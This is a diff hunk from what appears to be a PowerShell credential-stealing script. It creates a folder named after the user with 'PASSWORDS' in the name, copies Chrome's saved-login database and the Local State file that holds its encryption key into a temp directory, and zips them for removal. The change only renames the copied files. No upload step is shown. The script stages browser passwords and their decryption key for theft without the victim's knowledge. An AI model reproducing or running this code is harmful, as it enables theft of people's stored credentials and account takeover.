@@ -26,8 +26,8 @@ $FolderName = "$env:USERNAME-PASSWORDS-$(get-date -f yyyy-MM-dd_hh-mm)"
 $ZIP = "$FolderName.zip"
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
-Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination  $env:TEMP\$FolderName\output.txt
-Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination  $env:TEMP\$FolderName\key.txt
+Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination  $env:TEMP\$FolderName\Logins.db
+Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination  $env:TEMP\$FolderName\LocalState.json
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
